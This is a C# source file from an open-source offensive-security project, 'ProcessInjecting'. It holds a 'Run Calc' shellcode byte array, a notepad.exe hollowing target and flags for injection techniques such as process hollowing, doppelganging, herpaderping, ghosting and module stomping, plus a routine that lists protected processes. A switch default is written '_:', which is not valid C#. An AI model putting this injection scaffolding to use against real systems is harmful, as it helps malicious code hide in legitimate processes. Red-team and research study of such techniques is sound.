// Author: bopin (@bopin2020)
// Project: ProcessInjecting (https://github.com/bopin2020/ProcessInjecting)
// License: GNU GPLv3

using CommandLine;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static Vanara.PInvoke.Kernel32;

namespace ProcessInjecting
{
    /// <summary>
    /// Fields
    /// </summary>
    public partial class Misc
    {
        /* Run Calc */
        public static byte[] shellcode = new byte[184] {
            0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
            0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
            0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
            0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
            0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
            0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
            0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
            0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
            0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
            0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
            0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
            0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
            0x00,0x53,0xff,0xd5 };

        public static string HollowedProcessX85 = "C:\\Windows\\SysWOW64\\notepad.exe";

        public static bool process_Hollowing_flag = false;
        public static bool process_Doppelganging_flag = false;
        public static bool process_Herpaderping_flag = false;
        public static bool process_Ghosting_flag = false;
        public static bool process_TransactedHollowing = false;
        public static bool process_ModuleStomping = false;

        
    }
    /// <summary>
    /// Structs
    /// </summary>
    public partial class Misc
    { 
        
    }
    /// <summary>
    /// Function
    /// </summary>
    public partial class Misc
    {
    }



    /// <summary>
    /// 管理员有权限查看PPL进程
    /// </summary>
    public class PPLQuery
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }
        public static List<ValueTuple<string, uint, string>> data = new List<ValueTuple<string, uint, string>>();
        // Reference from PPLDump, GetProcessInformation  api
        public static List<ValueTuple<string, uint, string>> QueryPPLInfo()
        {
            Process[] ALLPROCESS = Process.GetProcesses();
            foreach (var item in ALLPROCESS)
            {
                SafeHPROCESS hProcess = default;
                IntPtr ProcessInformation = IntPtr.Zero;
                string pwszProtectionName = "";
                PROCESS_PROTECTION_LEVEL_INFORMATION level = new PROCESS_PROTECTION_LEVEL_INFORMATION { ProtectionLevel = PROTECTION_LEVEL.PROTECTION_LEVEL_NONE };

                PROTECTION_LEVEL pdwProtectionLevel;
                ProcessInformation = Marshal.AllocHGlobal(Marshal.SizeOf(level));

                Marshal.StructureToPtr(level, ProcessInformation, false);
                if (item.Id != 0 && item.Id != 4)
                {
                    hProcess = OpenProcess((uint)ProcessAccessFlags.QueryLimitedInformation, false, (uint)item.Id);
                    if (hProcess != null)
                    {
                        // Console.WriteLine("0x" + ProcessInformation.ToString("x"));
                        if (GetProcessInformation(hProcess, PROCESS_INFORMATION_CLASS.ProcessProtectionLevelInfo, ProcessInformation, (uint)Marshal.SizeOf(level)))
                        {
                            try
                            {
                                level = (PROCESS_PROTECTION_LEVEL_INFORMATION)Marshal.PtrToStructure(ProcessInformation, typeof(PROCESS_PROTECTION_LEVEL_INFORMATION));
                                pdwProtectionLevel = level.ProtectionLevel;
                                // GetProcessMitigationPolicy(hp, PROCESS_MITIGATION_POLICY.ProcessDEPPolicy, p, s);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine(e.Message);
                                Console.WriteLine(Marshal.GetLastWin32Error());
                                return null;
                            }
                            switch (pdwProtectionLevel)
                            {
                                case PROTECTION_LEVEL.PROTECTION_LEVEL_WINTCB_LIGHT:
                                    pwszProtectionName = "PsProtectedSignerWinTcb-Light";
                                    break;
                                case PROTECTION_LEVEL.PROTECTION_LEVEL_WINDOWS:
                                    pwszProtectionName = "PsProtectedSignerWindows";
                                    break;
                                case PROTECTION_LEVEL.PROTECTION_LEVEL_WINDOWS_LIGHT:
                                    pwszProtectionName = "PsProtectedSignerWindows-Light";
                                    break;
                                case PROTECTION_LEVEL.PROTECTION_LEVEL_ANTIMALWARE_LIGHT:
                                    pwszProtectionName = "PsProtectedSignerAntimalware-Light";
                                    break;
                                case PROTECTION_LEVEL.PROTECTION_LEVEL_LSA_LIGHT:
                                    pwszProtectionName = "PsProtectedSignerLsa-Light";
                                    break;
                                case PROTECTION_LEVEL.PROTECTION_LEVEL_WINTCB:
                                    pwszProtectionName = "PsProtectedSignerWinTcb";
                                    break;
                                case PROTECTION_LEVEL.PROTECTION_LEVEL_CODEGEN_LIGHT:
                                    pwszProtectionName = "PsProtectedSignerCodegen-Light";
                                    break;
                                case PROTECTION_LEVEL.PROTECTION_LEVEL_AUTHENTICODE:
                                    pwszProtectionName = "PsProtectedSignerAuthenticode";
                                    break;
                                case PROTECTION_LEVEL.PROTECTION_LEVEL_PPL_APP:
                                    pwszProtectionName = "PsProtectedSignerPplApp";
                                    break;
                                case PROTECTION_LEVEL.PROTECTION_LEVEL_NONE:
                                    pwszProtectionName = "None";
                                    break;
                                _:
                                    pwszProtectionName = "Unknown";
                            }
                            if (pwszProtectionName != "None")
                            {
                                data.Add(ValueTuple.Create<string, uint, string>(item.ProcessName, (uint)item.Id, pwszProtectionName));
                            }
                            Marshal.FreeHGlobal(ProcessInformation);
                        }
                    }
                    else
                    {
                        Console.WriteLine($"OpenProcess {item.Id} failed!");
                    }
                }

            }
            return data;
        }

        public static void ParseInfos()
        {
            Console.WriteLine("[+] PPL Modle Information");
            Console.WriteLine("==========================");
            // https://gist.githubusercontent.com/bopin2020/d3993f2fcfb17f3aa73f7379e5050c03/raw/b9304d5eeb95eef35b96fd91f18174ee24ef925e/QueryPPLInfo.cs
            foreach (var item in PPLQuery.QueryPPLInfo())
            {
                Console.WriteLine(item.Item1 + "\t" + item.Item2 + "\t" + item.Item3 + "\t");
            }
            Console.WriteLine("==========================");
        }

    }
}
